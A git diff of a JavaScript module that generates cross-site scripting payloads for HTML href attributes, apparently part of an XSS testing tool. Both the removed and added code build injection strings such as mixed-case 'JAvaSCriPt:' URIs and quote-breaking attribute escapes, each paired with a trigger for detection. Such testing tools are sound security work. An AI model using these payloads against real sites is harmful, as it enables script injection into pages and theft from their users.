@@ -1,39 +1,20 @@
-const {getTriggerCodeForCode} = require('./generators');
+const {getTriggerCodeForClass, getTriggerCodeForCode} = require('./generators');
+const htmlNormalAttributePayloads = require('./htmlNormalAttributePayloads');
 
-function htmlHrefAttributePayloads({jsCode, scriptTag, imgTag, aTag, pTag, tagTrigger, assert}) {
-    return [{
-        payload: `JAvaSCriPt:${jsCode}`,
-        trigger: getTriggerCodeForCode(`JAvaSCriPt:${jsCode}`),
-        assert,
-    }, {
-        payload: `">${scriptTag}`,
-        assert,
-    }, {
-        payload: `">${imgTag}`,
-        assert,
-    }, {
-        payload: `">${aTag}`,
-        trigger: tagTrigger,
-        assert,
-    }, {
-        payload: `">${pTag}`,
-        trigger: tagTrigger,
-        assert,
-    }, {
-        payload: `">${scriptTag}<a href="`,
-        assert,
-    }, {
-        payload: `">${imgTag}<a href="`,
-        assert,
-    }, {
-        payload: `">${aTag}<a href="`,
-        trigger: tagTrigger,
-        assert,
-    }, {
-        payload: `">${pTag}<a href="`,
-        trigger: tagTrigger,
-        assert,
-    }];
+function htmlHrefAttributePayloads(data) {
+    const {jsCode, tagClass} = data;
+    const exitStrings = ['"', "'", ''];
+    return [
+        {
+            payload: `JAvaSCriPt:void(${jsCode})`,
+            trigger: getTriggerCodeForCode(jsCode),
+        },
+        ...exitStrings.map(exit => ({
+            payload: `JAvaSCriPt:void(${jsCode})${exit} class=${tagClass}/${exit}`,
+            trigger: getTriggerCodeForClass(tagClass, 'click'),
+        })),
+        ...htmlNormalAttributePayloads(data)
+    ];
 }
 
 module.exports = htmlHrefAttributePayloads;
